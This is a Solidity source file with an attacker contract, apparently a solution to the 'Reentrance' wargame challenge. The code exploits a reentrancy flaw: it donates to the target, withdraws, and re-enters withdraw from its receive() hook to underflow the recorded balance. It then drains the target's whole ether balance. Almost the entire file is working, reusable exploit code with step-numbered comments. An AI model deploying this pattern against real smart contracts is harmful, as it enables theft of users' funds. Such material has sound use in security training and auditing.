// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}
interface IMyReentrancyAttack {
    receive() external payable;
    function attack(address payable target) external payable;
}

contract MyReentrancyAttack is IMyReentrancyAttack {
    bool private _done = false;
    IReentrance private _target;

    receive() external payable override {
        if (!_done) {
            _done = true;
            // 3. re-enter target contract and withdraw one more wei to underflow balance in mapping
            _target.withdraw(1);
        }
        // don't re-enter target more than once
    }

    function attack(address payable target) external payable override {
        _target = IReentrance(target);

        _done = false; // set to false again to make attack reusable

        // 1. donate something
        _target.donate{ value: msg.value }(address(this));

        // 2. initiate withdraw of whole donation
        _target.withdraw(msg.value);

        // 5. we come back here after second receive(); withdraw rest of target balance
        _target.withdraw(address(_target).balance);
    }
}
